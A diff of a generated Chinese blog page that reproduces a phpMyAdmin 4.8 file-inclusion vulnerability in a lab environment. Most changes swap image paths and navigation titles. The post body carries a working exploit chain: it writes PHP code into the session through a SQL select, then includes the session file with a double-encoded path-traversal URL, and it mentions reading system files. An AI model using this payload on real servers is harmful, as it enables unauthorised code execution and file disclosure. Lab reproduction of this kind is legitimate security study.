@@ -13,7 +13,7 @@
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: phpmyadmin4.8漏洞演示\n\n\n\n\n\n进入vulnsp网站，点击start to hack，跳转到VSPlat\n\n\n点击进入实验，点击开始按钮\n\n进入phpmyadmin登录界面，用户名：root，密码：toor登录\n\n点击SQL，输入如下命令：\n1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;\n\n\n\n获取自己的SESSION ID\n1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n\n\n\n   \n\n包含SESSION文件，成功利用该漏洞\n1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n网页输入payload，页面如下，成功利用该漏洞\n\n\n\n还可以查看 /etc/password 文件\n\n","dateCreated":"2019-07-28T13:23:57+08:00","dateModified":"2019-09-09T13:22:04+08:00","datePublished":"2019-07-28T13:23:57+08:00","description":"Abstract: phpmyadmin4.8漏洞演示","headline":"phpmyadmin文件包含漏洞复现","image":["http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/07/28/phpmyadmin-bug/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/07/28/phpmyadmin-bug/","keywords":"漏洞复现, phpmyadmin, 文件包含漏洞","thumbnailUrl":"http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: phpmyadmin4.8漏洞演示\n\n\n\n\n\n进入vulnsp网站，点击start to hack，跳转到VSPlat\n\n\n点击进入实验，点击开始按钮\n\n进入phpmyadmin登录界面，用户名：root，密码：toor登录\n\n点击SQL，输入如下命令：\n1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;\n\n\n\n获取自己的SESSION ID\n1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n\n\n\n   \n\n包含SESSION文件，成功利用该漏洞\n1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf\n\n网页输入payload，页面如下，成功利用该漏洞\n\n\n\n还可以查看 /etc/password 文件\n\n","dateCreated":"2019-07-28T13:23:57+08:00","dateModified":"2019-09-09T13:45:08+08:00","datePublished":"2019-07-28T13:23:57+08:00","description":"Abstract: phpmyadmin4.8漏洞演示","headline":"phpmyadmin文件包含漏洞复现","image":["http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/07/28/phpmyadmin-bug/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/07/28/phpmyadmin-bug/","keywords":"漏洞复现, phpmyadmin, 文件包含漏洞","thumbnailUrl":"http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg"}</script>
     <meta name="description" content="Abstract: phpmyadmin4.8漏洞演示">
 <meta name="keywords" content="漏洞复现,phpmyadmin,文件包含漏洞">
 <meta property="og:type" content="blog">
@@ -22,15 +22,15 @@
 <meta property="og:site_name" content="han个人博客">
 <meta property="og:description" content="Abstract: phpmyadmin4.8漏洞演示">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin2.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin3.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin4.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin1.png">
-<meta property="og:updated_time" content="2019-09-09T05:22:04.506Z">
+<meta property="og:image" content="http://yoursite.com/images/phpmyadmin2.png">
+<meta property="og:image" content="http://yoursite.com/images/phpmyadmin3.png">
+<meta property="og:image" content="http://yoursite.com/images/phpmyadmin4.png">
+<meta property="og:image" content="http://yoursite.com/images/phpmyadmin1.png">
+<meta property="og:updated_time" content="2019-09-09T05:45:08.685Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpmyadmin文件包含漏洞复现">
 <meta name="twitter:description" content="Abstract: phpmyadmin4.8漏洞演示">
-<meta name="twitter:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin2.png">
+<meta name="twitter:image" content="http://yoursite.com/images/phpmyadmin2.png">
     
     
         
@@ -307,7 +307,7 @@
 <li><p>点击SQL，输入如下命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin2.png" alt></p>
+<p><img src="/images/phpmyadmin2.png" alt></p>
 </li>
 <li><p>获取自己的SESSION ID</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf</span><br></pre></td></tr></table></figure>
@@ -315,17 +315,17 @@
 
 </li>
 </ol>
-<p>   <img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin3.png" alt></p>
+<p>   <img src="/images/phpmyadmin3.png" alt></p>
 <ol start="6">
 <li><p>包含SESSION文件，成功利用该漏洞</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>网页输入payload，页面如下，成功利用该漏洞</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin4.png" alt></p>
+<p><img src="/images/phpmyadmin4.png" alt></p>
 </li>
 </ol>
 <p>还可以查看 <code>/etc/password</code> 文件</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5Cphpmyadmin1.png" alt></p>
+<p><img src="/images/phpmyadmin1.png" alt></p>
 
             
 
@@ -350,9 +350,9 @@
                     
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/07/29/noteday11/"
-                    data-tooltip="note11"
-                    aria-label="PREVIOUS: note11"
+                    href="/2019/07/29/note11/"
+                    data-tooltip="笔记11"
+                    aria-label="PREVIOUS: 笔记11"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -365,8 +365,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/07/28/dvwa-deploy/"
-                    data-tooltip="dvwa-deploy"
-                    aria-label="NEXT: dvwa-deploy"
+                    data-tooltip="dvwa 在 CentOS 部署"
+                    aria-label="NEXT: dvwa 在 CentOS 部署"
                 >
                     
                         <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
@@ -465,9 +465,9 @@
                     
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/07/29/noteday11/"
-                    data-tooltip="note11"
-                    aria-label="PREVIOUS: note11"
+                    href="/2019/07/29/note11/"
+                    data-tooltip="笔记11"
+                    aria-label="PREVIOUS: 笔记11"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -480,8 +480,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/07/28/dvwa-deploy/"
-                    data-tooltip="dvwa-deploy"
-                    aria-label="NEXT: dvwa-deploy"
+                    data-tooltip="dvwa 在 CentOS 部署"
+                    aria-label="NEXT: dvwa 在 CentOS 部署"
                 >
                     
                         <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
@@ -669,7 +669,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/28/dvwa-deploy/"
-                            aria-label=": dvwa-deploy"
+                            aria-label=": dvwa 在 CentOS 部署"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
                         </a>
@@ -679,9 +679,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/28/dvwa-deploy/"
-                            aria-label=": dvwa-deploy"
+                            aria-label=": dvwa 在 CentOS 部署"
                         >
-                            <h3 class="media-heading">dvwa-deploy</h3>
+                            <h3 class="media-heading">dvwa 在 CentOS 部署</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -734,8 +734,8 @@
                     <div class="media-left">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/07/29/noteday11/"
-                            aria-label=": note11"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
                         </a>
@@ -744,10 +744,10 @@
                     <div class="media-body">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/07/29/noteday11/"
-                            aria-label=": note11"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
                         >
-                            <h3 class="media-heading">note11</h3>
+                            <h3 class="media-heading">笔记11</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -769,7 +769,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/29/week2sum/"
-                            aria-label=": week2sum"
+                            aria-label=": 第二周总结"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
@@ -779,9 +779,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/29/week2sum/"
-                            aria-label=": week2sum"
+                            aria-label=": 第二周总结"
                         >
-                            <h3 class="media-heading">week2sum</h3>
+                            <h3 class="media-heading">第二周总结</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -790,7 +790,7 @@
                                 
                             </span>
                         </span>
-                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结</p></div>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结，<code>note6-note10</code>的笔记。</p></div>
                     </div>
                     <div style="clear:both;"></div>
                     <hr>
@@ -868,7 +868,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/30/note12/"
-                            aria-label=": note12"
+                            aria-label=": 笔记12"
                         >
                             <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
                         </a>
@@ -878,9 +878,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/30/note12/"
-                            aria-label=": note12"
+                            aria-label=": 笔记12"
                         >
-                            <h3 class="media-heading">note12</h3>
+                            <h3 class="media-heading">笔记12</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -901,7 +901,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note13/"
-                            aria-label=": note13"
+                            aria-label=": 笔记13"
                         >
                             <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
                         </a>
@@ -911,9 +911,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note13/"
-                            aria-label=": note13"
+                            aria-label=": 笔记13"
                         >
-                            <h3 class="media-heading">note13</h3>
+                            <h3 class="media-heading">笔记13</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -934,7 +934,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note14/"
-                            aria-label=": note14"
+                            aria-label=": 笔记14"
                         >
                             <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
                         </a>
@@ -944,9 +944,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note14/"
-                            aria-label=": note14"
+                            aria-label=": 笔记14"
                         >
-                            <h3 class="media-heading">note14</h3>
+                            <h3 class="media-heading">笔记14</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -967,7 +967,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/03/note15/"
-                            aria-label=": note15"
+                            aria-label=": 笔记15"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
@@ -977,9 +977,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/03/note15/"
-                            aria-label=": note15"
+                            aria-label=": 笔记15"
                         >
-                            <h3 class="media-heading">note15</h3>
+                            <h3 class="media-heading">笔记15</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
